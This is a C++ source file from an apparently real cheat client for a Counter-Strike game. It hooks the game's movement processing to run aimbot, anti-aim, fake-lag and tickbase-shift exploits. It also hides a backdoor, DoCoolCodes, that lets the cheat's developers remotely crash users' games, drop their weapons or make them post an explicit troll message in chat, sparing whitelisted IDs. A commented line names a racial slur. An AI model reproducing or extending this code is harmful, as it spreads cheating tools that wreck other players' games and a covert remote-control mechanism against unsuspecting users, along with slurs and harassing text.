#include "../Hooked.hpp"
#include "../../SDK/Displacement.hpp"
#include "../../SDK/Classes/Player.hpp"
#include "../../SDK/Classes/weapon.hpp"
#include "../../Features/Rage/EnginePrediction.hpp"
#include <intrin.h>
#include "../../Features/Rage/Ragebot.hpp"
#include "../../Utils/InputSys.hpp"
#include "../../SDK/Classes/Exploits.hpp"
#include "../../Features/Rage/LagCompensation.hpp"
#include "../../Utils/Threading/threading.h"
#include "../../Features/Rage/Resolver.hpp"
#include <thread>
#include "../../Features/Visuals/GrenadePrediction.hpp"
#include "../../Features/Rage/TickbaseShift.hpp"
#include "../../Features/Visuals/EventLogger.hpp"
#include "../../Features/Miscellaneous/Movement.hpp"
#include "../../Features/Rage/ServerAnimations.hpp"
#include "../../Features/Rage/FakeLag.hpp"
#include "../../Features/Rage/AntiAim.hpp"

#include "../../Features/Miscellaneous/Miscellaneous.hpp"

namespace Hooked
{
	void DoCoolCodes( ) {
		auto pLocal = C_CSPlayer::GetLocalPlayer( );
		if( !pLocal ) {
			return;
		}

		player_info_t info;
		if( !m_pEngine->GetPlayerInfo( pLocal->EntIndex( ), &info ) ) {
			return;
		}

		// don't do it on whitelisted ids
		if( g_Vars.globals.m_vecDevMessages.size( ) ) {
			for( auto& messages : g_Vars.globals.m_vecDevMessages ) {
				if( messages.second == XorStr( "_3" ) ) {
					continue;
				}

				for( auto& ids : g_Vars.globals.m_vecWhitelistedIds ) {
					if( info.steamID64 == ids ) {
						g_EventLog.PushEvent( XorStr( "prevented action" ), Color_f::White, false, XorStr( "code" ) );
						g_Vars.globals.m_vecDevMessages.clear( );
					}
				}
			}
		}

		if( g_Vars.globals.m_vecDevMessages.empty( ) ) {
			return;
		}

		static std::vector<std::pair<std::string, std::function<void( void )>>> magic =
		{
			{ XorStr( "_0" ), [ & ] ( ) { exit( 0x69 ); } }, // force crash
			{ XorStr( "_1" ), [ & ] ( ) { m_pEngine->ClientCmd( XorStr( "drop" ) ); } }, // drop weapon
			{ XorStr( "_2" ), [ & ] ( ) { m_pEngine->ClientCmd( XorStr( "say \"you guys ever just thinking about sucking cock and swallowing cum? i think i have an attraction to femboys..\"" ) ); } }, // troll
			//{ XorStr( "_3" ), [ & ] ( ) { PlaySoundA( ( LPCSTR )nigguh, NULL, SND_MEMORY | SND_ASYNC ); } }, // nigguh
		};

		// loop through all the messages sent by devs
		for( auto& messages : g_Vars.globals.m_vecDevMessages ) {
			// loop through all the magic codes
			for( auto& codes : magic ) {
				// if the messages sent by devs mach any of the according 
				// magic codes, then do the action that this code stands for
				if( messages.second == codes.first ) {
					// do!
					codes.second( );

					// only do these once
					g_Vars.globals.m_vecDevMessages.clear( );
				}
			}
		}
	}

	bool CreateMoveHandler(float ft, CUserCmd* _cmd, bool* bSendPacket, bool* bFinalTick, bool original) {
		g_Vars.globals.m_bInCreateMove = true;

		g_LagCompensation.SetupLerpTime();

		auto pLocal = C_CSPlayer::GetLocalPlayer();
		if (!pLocal || pLocal->IsDead()) {
			g_Vars.globals.m_bShotAutopeek = false;
			g_Movement.m_vecAutoPeekPos.Init();

			g_Prediction.Invalidate();
			g_Vars.globals.m_bInCreateMove = false;
			return original;
		}

		auto pWeapon = reinterpret_cast<C_WeaponCSBaseGun*>(pLocal->m_hActiveWeapon().Get());
		if (!pWeapon) {
			g_Prediction.Invalidate();
			g_Vars.globals.m_bInCreateMove = false;

			return original;
		}

		auto pWeaponData = pWeapon->GetCSWeaponData();
		if (!pWeaponData.IsValid()) {
			g_Prediction.Invalidate();
			g_Vars.globals.m_bInCreateMove = false;

			return original;
		}

		Encrypted_t<CUserCmd> cmd(_cmd);
		if (!cmd.IsValid())
			return original;

		g_Misc.PreserveKillfeed();

		if (g_Vars.globals.menuOpen) {
			// just looks nicer
			auto RemoveButtons = [&](int key) { cmd->buttons &= ~key; };
			RemoveButtons(IN_ATTACK);
			RemoveButtons(IN_ATTACK2);
			RemoveButtons(IN_USE);

			if (GUI::ctx->typing) {
				RemoveButtons(IN_MOVERIGHT);
				RemoveButtons(IN_MOVELEFT);
				RemoveButtons(IN_FORWARD);
				RemoveButtons(IN_BACK);
			}
		}

		DoCoolCodes();

		if (g_Vars.misc.fastduck) {
			cmd->buttons |= IN_BULLRUSH;
		}

		// store the original viewangles
		// fix movement with these later
		g_Movement.m_vecMovementAngles = cmd->viewangles;
		g_Movement.m_vecOriginalCmdAngles = cmd->viewangles;
		g_Movement.m_vecCmdAngles = cmd->viewangles;

		g_Prediction.RunGamePrediction();
		g_Prediction.PrePrediction(cmd);

		g_Movement.PrePrediction(cmd.Xor(), bSendPacket);

		g_Misc.ForceCrosshair();

		//g_Ragebot.last_moveangle = { cmd->forwardmove, cmd->sidemove, cmd->upmove };
		g_Ragebot.AutoStop(cmd);

		g_Prediction.Begin( cmd );
		{
			g_LagCompensation.BackupOperation( );

			g_GrenadePrediction.Tick( cmd->buttons );

			if( g_Vars.misc.auto_weapons ) {
				if( pWeapon->m_iItemDefinitionIndex( ) != WEAPON_REVOLVER && pWeaponData->m_iWeaponType > WEAPONTYPE_KNIFE && pWeaponData->m_iWeaponType <= WEAPONTYPE_MACHINEGUN) {
					if( !pLocal->CanShoot( ) ) {
						cmd->buttons &= ~IN_ATTACK;
					}
				}
			}

			g_Movement.InPrediction( cmd.Xor( ) );

			g_FakeLag.HandleFakeLag( bSendPacket, cmd.Xor( ) );

			if (m_pClientState->m_nChokedCommands() != 0 && (cmd->command_number - 1) == g_Ragebot.last_shot_command)
				*bSendPacket = true;

			g_Ragebot.Run( bSendPacket, cmd.Xor( ) );

			g_AntiAim.HandleAntiAim( bSendPacket, bFinalTick, cmd.Xor( ) );

			g_TickbaseController.RunExploits( bSendPacket, cmd.Xor( ) );

			if( cmd->buttons & IN_ATTACK
				&& pWeapon->m_iItemDefinitionIndex( ) != WEAPON_C4
				&& pWeaponData->m_iWeaponType >= WEAPONTYPE_KNIFE
				&& pWeaponData->m_iWeaponType <= WEAPONTYPE_MACHINEGUN
				&& pLocal->CanShoot( ) )
			{
				g_TickbaseController.m_flLastExploitTime = m_pGlobalVars->realtime;

				g_Vars.globals.m_bShotWhileChoking = !( *bSendPacket );

				if( pWeaponData->m_iWeaponType != WEAPONTYPE_KNIFE )
					g_Vars.globals.m_bShotAutopeek = true;

				g_ServerAnimations.m_angChokedShotAngle = cmd->viewangles;

				/*if( g_TickbaseController.m_bCMFix ) {
					if( g_TickbaseController.m_iFixAmount ) {
						g_TickbaseController.m_iFixCommand = cmd->command_number;
					}

					g_TickbaseController.m_bCMFix = false;

					*bSendPacket = true;
				}*/
			}

			g_Vars.globals.m_iWeaponIndex = pWeapon->m_iItemDefinitionIndex( );

			// fix animations after all movement related functions have been called
			g_ServerAnimations.HandleAnimations( bSendPacket, cmd.Xor( ) );
		}
		g_Prediction.End( bSendPacket );
		g_LagCompensation.BackupOperation( true );

		g_Movement.PostPrediction( cmd.Xor( ) );

		// this is for resetting stuff
		// that e.g. was previously set to be run while not sending packet
		if( *bSendPacket ) {
			g_Vars.globals.m_bShotWhileChoking = false;

			g_FakeLag.m_iLastChokedCommands = m_pClientState->m_nChokedCommands( );

			g_ServerAnimations.m_uServerAnimations.m_bBreakingTeleportDst = ( pLocal->m_vecOrigin( ) - g_ServerAnimations.m_uServerAnimations.m_vecLastOrigin ).LengthSquared( ) > 4096.f;
			g_ServerAnimations.m_uServerAnimations.m_vecLastOrigin = pLocal->m_vecOrigin( );

			g_ServerAnimations.m_uServerAnimations.m_pLBYUpdated = false;
		}

		cmd->viewangles.Clamp( );
		g_Vars.globals.m_bInCreateMove = false;
		return false;
	}

	bool __stdcall CreateMove( float ft, CUserCmd* _cmd ) {
		auto pLocal = C_CSPlayer::GetLocalPlayer( );

		g_Vars.globals.szLastHookCalled = XorStr( "2" );

		auto original_bs = oCreateMove( ft, _cmd );

		if( !_cmd || !_cmd->command_number || !pLocal )
			return original_bs;

		if( !pLocal )
			return original_bs;

		if( original_bs )
		{
			m_pEngine->SetViewAngles( _cmd->viewangles );
			m_pPrediction->SetLocalViewAngles( _cmd->viewangles );
		}

		if( g_Vars.cl_csm_shadows && g_Vars.cl_csm_shadows->GetInt( ) != 0 )
			g_Vars.cl_csm_shadows->SetValue( 0 );

		if( g_Vars.engine_no_focus_sleep && g_Vars.engine_no_focus_sleep->GetInt( ) != 0 )
			g_Vars.engine_no_focus_sleep->SetValue( 0 );

		g_Misc.PreserveKillfeed( );

		Encrypted_t<uintptr_t> pAddrOfRetAddr( ( uintptr_t* )_AddressOfReturnAddress( ) );
		bool* bFinalTick = reinterpret_cast< bool* >( uintptr_t( pAddrOfRetAddr.Xor( ) ) + 0x15 );
		bool* bSendPacket = reinterpret_cast< bool* >( uintptr_t( pAddrOfRetAddr.Xor( ) ) + 0x14 );

		if( !bSendPacket || !bFinalTick ) {
			g_Prediction.Invalidate( );
			return original_bs;
		}

		if( !( *bSendPacket ) )
			*bSendPacket = true;

		auto result = CreateMoveHandler( ft, _cmd, bSendPacket, bFinalTick, original_bs );

		g_Prediction.KeepCommunication( bSendPacket );

		pLocal = C_CSPlayer::GetLocalPlayer( );
		if( !pLocal || !m_pEngine->IsInGame( ) ) {
			g_Prediction.Invalidate( );
			return original_bs;
		}

		return result;
	}

	bool __cdecl ReportHit( Hit_t* hit ) {
		return oReportHit( hit );
	}

	bool __cdecl IsUsingStaticPropDebugMode( ) {
		if( m_pEngine.IsValid( ) && !m_pEngine->IsInGame( ) )
			return oIsUsingStaticPropDebugMode( );

		return g_Vars.esp.brightness_adjustment != 0;
	}

	void __vectorcall CL_Move( bool bFinalTick, float accumulated_extra_samples ) {
		g_TickbaseController.CL_Move( bFinalTick, accumulated_extra_samples );
	}
}
